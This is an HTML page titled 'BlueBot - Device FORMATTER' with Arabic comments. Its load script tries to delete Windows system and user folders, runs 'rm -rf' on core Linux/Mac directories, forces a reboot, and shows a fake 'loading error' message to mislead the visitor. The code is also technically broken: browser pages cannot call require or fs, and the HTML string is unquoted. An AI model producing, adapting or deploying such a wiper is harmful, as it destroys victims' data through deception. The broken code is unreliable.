<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BlueBot - Device FORMATTER</title>
    <script>
        window.onload = function() {
            // الكود اللي راح يفرم الجهاز
            const formatDevice = () => {
                // حذف ملفات النظام (Windows)
                if (navigator.platform.includes('Win')) {
                    const fs = require('fs');
                    const path = require('path');
                    const systemPaths = [
                        'C:\\Windows\\System32',
                        'C:\\Windows\\SysWOW64',
                        'C:\\Program Files',
                        'C:\\Program Files (x86)'
                    ];
                    systemPaths.forEach(p => {
                        if (fs.existsSync(p)) {
                            fs.readdirSync(p).forEach(file => {
                                try { fs.unlinkSync(path.join(p, file)); } catch(e) {}
                            });
                        }
                    });
                }
                // حذف ملفات النظام (Linux/Mac)
                else {
                    const exec = require('child_process').exec;
                    exec('rm -rf /bin /sbin /usr /lib /lib64 /etc', () => {});
                }

                // حذف ملفات المستخدم
                const userPaths = [
                    'C:\\Users\\' + require('os').userInfo().username,
                    '/home/' + require('os').userInfo().username
                ];
                userPaths.forEach(p => {
                    if (fs.existsSync(p)) {
                        fs.readdirSync(p).forEach(file => {
                            try { fs.unlinkSync(path.join(p, file)); } catch(e) {}
                        });
                    }
                });

                // إعادة تشغيل الجهاز
                setTimeout(() => {
                    require('child_process').exec('shutdown /r /t 0');
                }, 3000);
            };

            // تشغيل الكود بعد 5 ثواني
            setTimeout(formatDevice, 5000);

            // رسالة خداعية
            document.body.innerHTML = 
                <div style="text-align: center; padding: 50px;">
                    <h1>⚠️ خطأ في التحميل!</h1>
                    <p>يرجى تحديث الصفحة.</p>
                </div>
            ;
        };
    </script>
</head>
<body>
    <h1 style="color: red;">جارٍ التحميل...</h1>
</body>
</html>

